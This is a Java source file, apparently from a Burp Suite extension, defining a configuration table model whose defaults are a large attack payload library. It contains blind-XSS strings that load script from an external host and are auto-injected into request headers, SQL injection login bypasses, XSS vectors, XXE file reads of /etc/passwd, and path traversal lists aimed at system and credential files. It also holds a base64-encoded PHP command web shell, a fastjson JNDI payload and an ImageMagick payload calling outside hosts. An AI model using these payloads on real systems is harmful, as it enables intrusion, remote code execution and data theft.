package model;

import javax.swing.table.AbstractTableModel;
import burp.BurpExtender;
import java.io.PrintWriter;
import java.util.*;

import config.ConfigEntry;

public class ConfigTableModel extends AbstractTableModel{
    private static final long serialVersionUID = 1L;
    private List<ConfigEntry> configEntries =new ArrayList<ConfigEntry>();
    private static final String[] titles = new String[] {
            "Key", "Value", "Type", "Enable", "Comment"
    };

    public ConfigTableModel(){
        configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
        configEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
        configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));

        configEntries.add(new ConfigEntry("Chunked-Length", "10",ConfigEntry.Config_Chunked_Variable,true,false));
        configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
        configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
        
        configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
        configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));

        configEntries.add(new ConfigEntry("DNSlogServer", "bit.0y0.link",ConfigEntry.Config_Basic_Variable,true,false));
        configEntries.add(new ConfigEntry("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe",ConfigEntry.Config_Basic_Variable,true,false));
        configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
        
        configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true));
        configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,true));
        configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));

        configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"/><script src=https://bmw.xss.ht></script>",ConfigEntry.Action_Add_Or_Replace_Header,true));
        configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Append_To_header_value,true));
        configEntries.add(new ConfigEntry("hackbar", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=bit.0y0.link/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));

        configEntries.add(new ConfigEntry("basic", "<script>alert('XSS')</script>, <scr<script>ipt>alert('XSS')</scr<script>ipt>, \"><script>alert('XSS')</script>, \"><script>alert(String.fromCharCode(88,83,83))</script>",ConfigEntry.Config_Xss_Payload,true));
        configEntries.add(new ConfigEntry("img", "<img src=x onerror=alert('XSS');>, <img src=x onerror=alert('XSS')//, <img src=x onerror=alert(String.fromCharCode(88,83,83));>, <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>, <img src=x:alert(alt) onerror=eval(src) alt=xss>, \"><img src=x onerror=alert('XSS');>, \"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",ConfigEntry.Config_Xss_Payload,true));
        configEntries.add(new ConfigEntry("svg", "<svg onload=alert(1)>, <svg/onload=alert('XSS')>, <svg onload=alert(1)//, <svg/onload=alert(String.fromCharCode(88,83,83))>, <svg id=alert(1) onload=eval(id)>, \"><svg/onload=alert(String.fromCharCode(88,83,83))>, \"><svg/onload=alert(/XSS/)",ConfigEntry.Config_Xss_Payload,true));
        configEntries.add(new ConfigEntry("html", "<body onload=alert(/XSS/.source)>, <input autofocus onfocus=alert(1)>, <select autofocus onfocus=alert(1)>, <textarea autofocus onfocus=alert(1)>, <keygen autofocus onfocus=alert(1)>, <video/poster/onerror=alert(1)>, <video><source onerror=\"javascript:alert(1)\">, <video src=_ onloadstart=\"alert(1)\">, <details/open/ontoggle=\"alert`1`\">, <audio src onloadstart=alert(1)>, <marquee onstart=alert(1)>",ConfigEntry.Config_Xss_Payload,true));
        configEntries.add(new ConfigEntry("meta tag", "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">, <meta/content=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"http-equiv=refresh>, <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",ConfigEntry.Config_Xss_Payload,true));

        configEntries.add(new ConfigEntry("login bypass", "' or ''=', ' or 1='1, ' or '1'='1, ' or ' 1=1, ' or 1=1--, ' or 1=1#, ' or 1=1/*, ') or '1'='1--, ') or ('1'='1--, ' or 1=1)#, ' or '1?='1, ' or 'x'='x, ' or 0=0 –, or 0=0 –, ' or 0=0 #, or 0=0 #, ') or ('x'='x, ' or 1=1–, ' or a=a–, ') or ('a'='a, hi' or 1=1 –, 'or'1=1?, '-', ' ', '&', '^', '*', ' or ''-', ' or '' ', ' or ''&', ' or ''^', ' or ''*', or true--, ' or true--, ') or ('x')=('x, ')) or (('x'))=(('x, admin' --, admin' #, admin'/*, admin' or '1'='1, admin' or '1'='1'--, admin' or '1'='1'#, admin' or '1'='1'/*, admin'or 1=1 or ''=', admin') or ('1'='1, admin') or ('1'='1'/*, 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("error based", "Get Version, Get Databases, Get Tables, Get Columns, Get Data",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("xpath extractvalue", "EV-Get Version, EV-Get Databases, EV-Get Tables, EV-Get Columns, EV-Get Data",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("xpath updatexml", "UX-Get Version, UX-Get Databases, UX-Get Tables, UX-Get Columns, UX-Get Data",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("polygon/multipiont", "POL-Get Version, POL-Get Tables",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("multipiont dios", "M-DIOS 1, M-DIOS 2, M-DIOS 3, M-DIOS 4",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("advance error based(mysql >= 5.5)", "AEB-Get Version, AEB-Get Tables",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("dios by madblood(mysql >= 5.5)", "DIOS 1, DIOS 2, DIOS 3, DIOS 4, DIOS 5, DIOS 6, DIOS 7, DIOS 8, DIOS 9",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("double query based", "DQ-Get Version, DQ-Get Database, DQ-Get Tables, DQ-Get Columns, DQ-Get Data",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("mssql error based", "MS-Get Version, MS-Get Database, MS-Get User, MSSQL DIOS",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("column count", "Order By, Group By, Procedure Analyse",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("union statements", "Union Select, Union All Select (int), Union All Select(null), (INT),(INT), (NULL),(NULL)",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("basic statements", "User,DB,Version, Count Databases, File Priv (USER_PRIVILEGES), File Priv (MySQL System Table)",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("databses", "DB Group Concat, DB One Shot",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("tables", "Table Group Concat, Table One Shot",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("columns", "Column Group Concat, Column One Shot",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("data", "Data Group Concat, Data One Shot",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("dios mysql", "DIOS by makman, DIOS by makman v2, DIOS by An0n 3xPloiTeR, DIOS by d3vilbug, DIOS by Shariq, DIOS by Ajkaro, DIOS by Madblood, tr0jan benchmark(), DIOS by Dr.Z3r0, DIOS by Zen, DIOS using replace, DIOS WAF, tr0jan WAF, DIOS by Zen WAF, Madblood WAF, DIOS by AkDK, DIOS by AkDK v2, DIOS by AkDK v3",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("dios postgres", "For Postgre 8.4, For Postgre 9.1, For All Versions",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("dios mssql", "DIOS By Rummy/Zen",ConfigEntry.Config_Sql_Payload,true));
        configEntries.add(new ConfigEntry("variable methods", "DB Names",ConfigEntry.Config_Sql_Payload,true));

        configEntries.add(new ConfigEntry("cmd shell", "bash, nc, nc without -e, php, python, perl, ruby, nodejs",ConfigEntry.Config_Shell_Payload,true));
        configEntries.add(new ConfigEntry("web shell", ".php, .asp, .aspx, .jsp, .perl, .cfm",ConfigEntry.Config_Shell_Payload,true));

        configEntries.add(new ConfigEntry("basic xxe", "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n <userInfo>\n  <firstName>John</firstName>\n  <lastName>&example;</lastName>\n </userInfo>",ConfigEntry.Config_XXE_Payload,true));
        configEntries.add(new ConfigEntry("xxe data", "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ELEMENT data (#ANY)>\n<!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>",ConfigEntry.Config_XXE_Payload,true));
        configEntries.add(new ConfigEntry("xxe foo", "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n  <!DOCTYPE foo [  \n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>",ConfigEntry.Config_XXE_Payload,true));
        configEntries.add(new ConfigEntry("xxe base64", "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",ConfigEntry.Config_XXE_Payload,true));
        configEntries.add(new ConfigEntry("php xxe basic", "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>",ConfigEntry.Config_XXE_Payload,true));
        configEntries.add(new ConfigEntry("php xxe base64", "<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY % xxe SYSTEM \"php://filter/convert.bae64-encode/resource=http://127.0.0.1\" >\n]>",ConfigEntry.Config_XXE_Payload,true));

        configEntries.add(new ConfigEntry("simple check", "/etc/passwd, /etc/passwd%00, etc%2fpasswd, etc%2fpasswd%00, etc%5cpasswd, etc%5cpasswd%00, etc%c0%afpasswd, etc%c0%afpasswd%00, ../../../etc/passwd, ../../../etc/passwd%00, %252e%252e%252fetc%252fpasswd, %252e%252e%252fetc%252fpasswd%00, ../../../../../../../../../etc/passwd..\\.\\.\\.\\.\\.\\.\\.\\., ../../../../[…]../../../../../etc/passwd, ....//....//etc/passwd, ..///////..////..//////etc/passwd, /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd, C:\\boot.ini, C:\\WINDOWS\\win.ini",ConfigEntry.Config_LFI_Payload,true));
        configEntries.add(new ConfigEntry("path traversal", "../, ..%2f, %2e%2e/, %2e%2e%2f, ..%252f, %252e%252e/, %252e%252e%252f, ..\\, ..%255c, ..%5c..%5c, %2e%2e\\, %2e%2e%5c, %252e%252e\\, %252e%252e%255c, ..%c0%af, %c0%ae%c0%ae/, %c0%ae%c0%ae%c0%af, ..%25c0%25af, ..%c1%9c",ConfigEntry.Config_LFI_Payload,true));
        configEntries.add(new ConfigEntry("wrapper", "expect://id, expect://ls, php://input, php://filter/read=string.rot13/resource=index.php, php://filter/convert.base64-encode/resource=index.php, pHp://FilTer/convert.base64-encode/resource=index.php, php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd, data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",ConfigEntry.Config_LFI_Payload,true));
        configEntries.add(new ConfigEntry("proc", "/proc/self/environ, /proc/self/cmdline, /proc/self/stat, /proc/self/status, /proc/self/fd/0, /proc/self/fd/1, /proc/self/fd/2, /proc/self/fd/3",ConfigEntry.Config_LFI_Payload,true));
        configEntries.add(new ConfigEntry("log files", "/var/log/apache/access.log, /var/log/apache/error.log, /var/log/vsftpd.log, /var/log/sshd.log, /var/log/mail, /var/log/httpd/error_log, /usr/local/apache/log/error_log, /usr/local/apache2/log/error_log, /var/log/access_log, /var/log/access.log, /var/log/error_log, /var/log/error.log, /var/log/apache/access_log, /var/log/apache2/access_log, /var/log/apache2/error.log, /var/log/httpd/access_log, /opt/lampp/logs/access_log, /opt/lampp/logs/access.log, /opt/lampp/logs/error_log, /opt/lampp/logs/error.log",ConfigEntry.Config_LFI_Payload,true));
        configEntries.add(new ConfigEntry("windows file", "C:\\boot.ini, C:\\WINDOWS\\win.ini, C:\\WINDOWS\\php.ini, C:\\WINDOWS\\System32\\Config\\SAM, C:\\WINNT\\php.ini, C:\\xampp\\phpMyAdmin\\config.inc, C:\\xampp\\phpMyAdmin\\phpinfo.php, C:\\xampp\\phpmyadmin\\config.inc.php, C:\\xampp\\apache\\conf\\httpd.conf, C:\\xampp\\MercuryMail\\mercury.ini, C:\\xampp\\php\\php.ini, C:\\xampp\\phpMyAdmin\\config.inc.php, C:\\xampp\\tomcat\\conf\\tomcat-users.xml, C:\\xampp\\tomcat\\conf\\web.xml, C:\\xampp\\sendmail\\sendmail.ini, C:\\xampp\\webalizer\\webalizer.conf, C:\\xampp\\webdav\\webdav.txt, C:\\xampp\\apache\\logs\\error.log, C:\\xampp\\apache\\logs\\access.log, C:\\xampp\\FileZillaFTP\\Logs, C:\\xampp\\FileZillaFTP\\Logs\\error.log, C:\\xampp\\FileZillaFTP\\Logs\\access.log, C:\\xampp\\MercuryMail\\LOGS\\error.log, C:\\xampp\\MercuryMail\\LOGS\\access.log, C:\\xampp\\mysql\\data\\mysql.err, C:\\xampp\\sendmail\\sendmail.log",ConfigEntry.Config_LFI_Payload,true));

        configEntries.add(new ConfigEntry("fastjson", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%host.fastjson.test.dnslog.com/evil\",\"autoCommit\":true}",ConfigEntry.Config_Custom_Payload,true));
        configEntries.add(new ConfigEntry("Imagemagick","cHVzaCBncmFwaGljLWNvbnRleHQNCnZpZXdib3ggMCAwIDY0MCA0ODANCmltYWdlIG92ZXIgMCwwIDAsMCAnaHR0cHM6Ly9pbWFnZW1hZ2ljLmJpdC4weTAubGluay94LnBocD94PWB3Z2V0IC1PLSAlcyA+IC9kZXYvbnVsbGAnDQpwb3AgZ3JhcGhpYy1jb250ZXh0",ConfigEntry.Config_Custom_Payload_Base64,true));
    }

    public List<String> getConfigJsons(){
        List<String> result = new ArrayList<String>();
        for(ConfigEntry line:configEntries) {
            String linetext = line.ToJson();
            result.add(linetext);
        }
        return result;
    }


    public List<ConfigEntry> getConfigByType(String type) {

        List<ConfigEntry> result = new ArrayList<ConfigEntry>();
        for (ConfigEntry entry:configEntries) {
            if (entry.getType().equals(type) && entry.isEnable()) {
                result.add(entry);
            }
        }
        return result;
    }


    public String getConfigValueByKey(String key) {
        for (ConfigEntry entry:configEntries) {
            if (entry.getKey().equals(key) && entry.isEnable()) {
                return entry.getValue();
            }
        }
        return null;
    }
    
    public String getConfigTypeByKey(String key) {
        for (ConfigEntry entry:configEntries) {
            if (entry.getKey().equals(key) && entry.isEnable()) {
                return entry.getType();
            }
        }
        return null;
    }

    public Set<String> getConfigValueSetByKey(String key) {
        Set<String> result = new HashSet<>();
        for (ConfigEntry entry:configEntries) {
            if (entry.getKey().equals(key) && entry.isEnable()) {
                String tmp = entry.getValue().trim();
                if (!tmp.equals("")){
                    String[] tmpArray = tmp.split(",");
                    for (String url:tmpArray){
                        result.add(url.trim());
                    }
                    //result.addAll(Arrays.asList(tmpArray));
                }
            }
        }
        return result;
    }

    public void setConfigByKey(String key,String value) {
        for (ConfigEntry entry:configEntries) {
            if (entry.getKey().equals(key)) {
                int index = configEntries.indexOf(entry);
                entry.setValue(value);
                configEntries.set(index,entry);
                fireTableRowsUpdated(index,index);
            }
        }
    }


    public void setConfigValueSetByKey(String key,Set<String> vauleSet) {
        for (ConfigEntry entry:configEntries) {
            if (entry.getKey().equals(key)) {
                int index = configEntries.indexOf(entry);

                String valueStr = vauleSet.toString();
                valueStr = valueStr.replace("[", "");
                valueStr = valueStr.replace("]", "");
                valueStr = valueStr.replaceAll(" ","");

                entry.setValue(valueStr);
                configEntries.set(index,entry);
                fireTableRowsUpdated(index,index);
            }
        }
    }

    ////////////////////// extend AbstractTableModel////////////////////////////////

    @Override
    public int getColumnCount()
    {
        return titles.length;
    }

    @Override
    public Class<?> getColumnClass(int columnIndex)
    {    switch(columnIndex) 
        {
        case 3: 
            return boolean.class;//enable
        default:
            return String.class;
        }

    }

    @Override
    public int getRowCount()
    {
        return configEntries.size();
    }

    //define header of table???
    @Override
    public String getColumnName(int columnIndex) {
        if (columnIndex >= 0 && columnIndex <= titles.length) {
            return titles[columnIndex];
        }else {
            return "";
        }
    }

    @Override
    public boolean isCellEditable(int rowIndex, int columnIndex) {
        ConfigEntry entry = configEntries.get(rowIndex);
        if (!entry.isEditable()) {
            if (columnIndex ==0 ||columnIndex ==2) {
                //name--0; type---2
                return false;
            }
        }
        return true;
    }

    @Override
    public Object getValueAt(int rowIndex, int columnIndex)
    {
        ConfigEntry entry = configEntries.get(rowIndex);
        switch (columnIndex)
        {
        case 0:
            return entry.getKey();
        case 1:
            return entry.getValue();
        case 2:
            return entry.getType();
        case 3:
            return entry.isEnable();
        case 4:
            return entry.getComment();
        default:
            return "";
        }
    }

    
    /*
     * Don't need to implement this method unless your table's
     * data can change.
     */
    @Override
    public void setValueAt(Object value, int row, int col) {
        ConfigEntry entry = configEntries.get(row);
        switch (col)
        {
        case 0:
            entry.setKey((String) value);
            break;
        case 1:
            entry.setValue((String) value);
            break;
        case 2:
            entry.setType((String) value);
            break;
        case 3://当显示true/false的时候，实质是字符串，需要转换。当使用勾选框的时候就是boolen
//            if (((String)value).equals("true")) {
//                entry.setEnable(true);
//            }else {
//                entry.setEnable(false);
//            }
            entry.setEnable((boolean)value);
            break;
        case 4:
            entry.setComment((String) value);
            break;
        default:
            break;
        }
        fireTableCellUpdated(row, col);
    }
    
    //////////////////////extend AbstractTableModel////////////////////////////////

    public void addNewConfigEntry(ConfigEntry lineEntry){
        PrintWriter stdout = new PrintWriter(BurpExtender.mCallbacks.getStdout(), true);
        synchronized (configEntries) {
            configEntries.add(lineEntry);
            int row = configEntries.size();
            //fireTableRowsInserted(row, row);
            //need to use row-1 when add setRowSorter to table. why??
            //https://stackoverflow.com/questions/6165060/after-adding-a-tablerowsorter-adding-values-to-model-cause-java-lang-indexoutofb
            //fireTableRowsInserted(row-1, row-1);
            fireTableRowsInserted(row-2, row-2);
        }
    }

    public void removeRows(int[] rows) {
        PrintWriter stdout1 = new PrintWriter(BurpExtender.mCallbacks.getStdout(), true);
        synchronized (configEntries) {
            //because thread let the delete action not in order, so we must loop in here.
            //list length and index changed after every remove.the origin index not point to right item any more.
            Arrays.sort(rows); //升序
            for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
                String key = configEntries.get(rows[i]).getKey();
                this.fireTableRowsDeleted(rows[i], rows[i]);
                configEntries.remove(rows[i]);
                stdout1.println("!!! "+key+" deleted");
                this.fireTableRowsDeleted(rows[i], rows[i]);
            }
        }

    }


    public void updateRows(int[] rows) {
        synchronized (configEntries) {
            //because thread let the delete action not in order, so we must loop in here.
            //list length and index changed after every remove.the origin index not point to right item any more.
            Arrays.sort(rows); //升序
            for (int i=rows.length-1;i>=0 ;i-- ) {//降序删除才能正确删除每个元素
                ConfigEntry checked = configEntries.get(rows[i]);
                configEntries.remove(rows[i]);
                configEntries.add(rows[i], checked);
            }
            this.fireTableRowsUpdated(rows[0], rows[rows.length-1]);
        }
    }

    public List<ConfigEntry> getConfigEntries() {
        return configEntries;
    }


    public void setConfigEntries(List<ConfigEntry> configEntries) {
        this.configEntries = configEntries;
    }
}